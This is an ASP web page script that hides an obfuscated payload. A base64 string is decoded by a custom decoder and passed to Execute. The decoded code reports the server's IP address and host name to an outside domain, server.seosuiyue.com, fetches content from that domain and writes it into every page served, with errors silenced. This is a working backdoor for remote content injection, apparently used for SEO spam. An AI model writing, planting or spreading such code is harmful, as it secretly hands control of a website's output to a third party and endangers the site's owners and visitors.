<%Str="DQpvbiBlcnJvciByZXN1bWUgbmV4dA0KZnVuY3Rpb24gZ2V0SFRUUFBhZ2UodXJsKQ0KZGltIEh0dHANCnNldCBIdHRwPXNlcnZlci5jcmVhdGVvYmplY3QoIk1TWE1MMi5YTUxIVFRQIikNCkh0dHAub3BlbiAiR0VUIix1cmwsZmFsc2UNCkh0dHAuc2VuZCgpDQppZiBIdHRwLnJlYWR5c3RhdGU8PjQgdGhlbiANCmV4aXQgZnVuY3Rpb24NCmVuZCBpZg0KZ2V0SFRUUFBhZ2U9Ynl0ZXNUb0JTVFIoSHR0cC5yZXNwb25zZUJvZHksIkdCMjMxMiIpDQpzZXQgaHR0cD1ub3RoaW5nDQppZiBlcnIubnVtYmVyPD4wIHRoZW4gZXJyLkNsZWFyIA0KZW5kIGZ1bmN0aW9uDQpGdW5jdGlvbiBCeXRlc1RvQnN0cihib2R5LENzZXQpDQpkaW0gb2Jqc3RyZWFtDQpzZXQgb2Jqc3RyZWFtID0gU2VydmVyLkNyZWF0ZU9iamVjdCgiYWRvZGIuc3RyZWFtIikNCm9ianN0cmVhbS5UeXBlID0gMQ0Kb2Jqc3RyZWFtLk1vZGUgPTMNCm9ianN0cmVhbS5PcGVuDQpvYmpzdHJlYW0uV3JpdGUgYm9keQ0Kb2Jqc3RyZWFtLlBvc2l0aW9uID0gMA0Kb2Jqc3RyZWFtLlR5cGUgPSAyDQpvYmpzdHJlYW0uQ2hhcnNldCA9IENzZXQNCkJ5dGVzVG9Cc3RyID0gb2Jqc3RyZWFtLlJlYWRUZXh0IA0Kb2Jqc3RyZWFtLkNsb3NlDQpzZXQgb2Jqc3RyZWFtID0gbm90aGluZw0KRW5kIEZ1bmN0aW9uDQpkaW0gdXJsLGlwLHl1bWluZyxzZXJ2ZXJ2LG5laXJvbmcsYmFuYmVuLGR1YW5rb3UNCmR1YW5rb3U9IiINCmlmIFJlcXVlc3QuU2VydmVyVmFyaWFibGVzKCJTZXJ2ZXJfUG9ydCIpPD4iODAiIHRoZW4NCglkdWFua291PSI6IiZSZXF1ZXN0LlNlcnZlclZhcmlhYmxlcygiU2VydmVyX1BvcnQiKQ0KZW5kIGlmDQpzZXJ2ZXJ2PSJodHRwOi8vc2VydmVyLnNlb3N1aXl1ZS5jb20iDQppcD1SZXF1ZXN0LlNlcnZlclZhcmlhYmxlcygiTE9DQUxfQUREUiIpDQp5dW1pbmc9UmVxdWVzdC5TZXJ2ZXJWYXJpYWJsZXMoIlNFUlZFUl9OQU1FIikmZHVhbmtvdQ0KYmFuYmVuPSJ2MS4xMSINCnVybD1zZXJ2ZXJ2JiIvZnV3dS5hc3A/aXA9IiZpcCYiJnl1bWluZz0iJnl1bWluZyYiJmJhbmJlbj0iJmJhbmJlbg0KDQpuZWlyb25nPWdldEhUVFBQYWdlKHVybCkNCnJlc3BvbnNlLldyaXRlKG5laXJvbmcpDQo="%>
<% 
const BASE_SN_MAP_INIT="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" 
dim newline 
dim BaseAspEncMap(63) 
dim BaseAspDecMap(127) 
'初始化函数 
PUBLIC SUB initCodecs() 
' 初始化变量 
newline = "<P>" & chr(13) & chr(10) 
dim max, idx 
max = len(BASE_SN_MAP_INIT) 
for idx = 0 to max - 1 
BaseAspEncMap(idx) = mid(BASE_SN_MAP_INIT, idx + 1, 1) 
next 
for idx = 0 to max - 1 
BaseAspDecMap(ASC(BaseAspEncMap(idx))) = idx 
next 
END SUB 
PUBLIC FUNCTION BaseAspDecode(scrambled) 
if len(scrambled) = 0 then 
BaseAspDecode = "" 
exit function 
end if 
dim realLen 
realLen = len(scrambled) 
do while mid(scrambled, realLen, 1) = "=" 
realLen = realLen - 1 
loop 
dim ret, ndx, by4, first, second, third, fourth 
ret = "" 
by4 = (realLen \ 4) * 4 
ndx = 1 
do while ndx <= by4 
first = BaseAspDecMap(asc(mid(scrambled, ndx+0, 1))) 
second = BaseAspDecMap(asc(mid(scrambled, ndx+1, 1))) 
third = BaseAspDecMap(asc(mid(scrambled, ndx+2, 1))) 
fourth = BaseAspDecMap(asc(mid(scrambled, ndx+3, 1))) 
ret = ret & chr( ((first * 4) AND 255) + ((second \ 16) AND 3)) 
ret = ret & chr( ((second * 16) AND 255) + ((third \ 4) AND 15)) 
ret = ret & chr( ((third * 64) AND 255) + (fourth AND 63)) 
ndx = ndx + 4 
loop 
if ndx < realLen then 
first = BaseAspDecMap(asc(mid(scrambled, ndx+0, 1))) 
second = BaseAspDecMap(asc(mid(scrambled, ndx+1, 1))) 
ret = ret & chr( ((first * 4) AND 255) + ((second \ 16) AND 3)) 
if realLen MOD 4 = 3 then 
third = BaseAspDecMap(asc(mid(scrambled,ndx+2,1))) 
ret = ret & chr( ((second * 16) AND 255) + ((third \ 4) AND 15)) 
end if 
end if 
BaseAspDecode=ret 
END FUNCTION 
call initCodecs 
%>
<%Execute(BaseAspDecode(Str))%>